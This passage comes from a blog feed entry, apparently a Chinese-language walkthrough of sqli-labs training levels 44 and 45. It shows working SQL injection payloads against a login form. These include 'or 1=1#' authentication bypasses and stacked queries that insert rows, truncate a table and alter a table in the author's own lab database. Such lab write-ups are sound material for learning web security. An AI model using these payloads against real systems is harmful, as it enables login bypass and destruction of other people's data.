data</p><p>login_user=admin’&amp;login_password=qwe&amp;mysubmit=Login</p><p>login_user=admin&quot;&amp;login_password=qwe&amp;mysubmit=Login</p><p>login_user=admin&amp;login_password=qwe’&amp;mysubmit=Login</p><p>login_user=admin&amp;login_password=qwe&quot;&amp;mysubmit=Login</p><p>说明本关不报错</p><p>盲注找闭合的方法其实也很简单，像本关这样两个输入框的正确值都不知道的情况下，在普通找闭合的 payload 中闭合符号之后增加 **or 1=1#** 就行，如果返回的页面显示登录成功，说明闭合成功。</p><p>用 hackbar 向</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/login.php</span><br></pre></td></tr></table></figure><p>发送如下 payload 检查 username 输入框是否有注入点</p><p>login_user=admin’ or 1=1#&amp;login_password=qwe&amp;mysubmit=Login</p><p>login_user=admin&quot; or 1=1#&amp;login_password=qwe&amp;mysubmit=Login</p><p>页面回显都是下图这样登录失败的页面，username 输入框没找到注入点<br><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113622.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113622.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>送如下 payload 检查 password 输入框是否有注入点</p><p>login_user=admin&amp;login_password=pass’ or 1=1#&amp;mysubmit=Login</p><p>成功</p><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113623.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113623.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>剩下的就是堆叠注入了<br>这里来使用试下清空表中所有数据的 sql 语句</p><p>先在 oblivion10 数据库中新建几个数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=qwe&#x27;;insert into oblivion10.test66 values(1,&#x27;tset2&#x27;)#&amp;mysubmit=Login</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">login_user=admin&amp;login_password=qwe&#x27;;insert into oblivion10.test66 values(2,&#x27;tset2&#x27;)#&amp;mysubmit=Login</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">login_user=admin&amp;login_password=qwe&#x27;;insert into oblivion10.test66 values(3,&#x27;tset3&#x27;)#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113624.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113624.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>尝试删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=qwe&#x27;;truncate table oblivion10.test66#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113625.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113625.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>成功删除</p><h2 id="sqli-labs-45"><a class="markdownIt-Anchor" href="#sqli-labs-45">#</a> sqli-labs-45</h2><p>用 44 关写到的方法</p><p>post data 输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=qwe&#x27;) or 1=1#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113626.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113626.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>本关尝试给 oblivion10 数据库中 test66 表新增一列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=qwe&#x27;);alter table oblivion10.test66 add column num int(10)#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113627.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113627.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113628.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113628.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>新增成功</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;sqli-labs-41-45&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#sqli-labs-41-45&quot;&gt;#&lt;/a&gt; sqli-labs-41-45&lt;/h1&gt;</summary>
    
    
    
    <category term="sqli-labs" scheme="https://dr4x3zz.github.io/categories/sqli-labs/"/>
    
    
    <category term="sqli-labs" scheme="https://dr4x3zz.github.io/tags/sqli-labs/"/>
    
  </entry>
  
</feed>
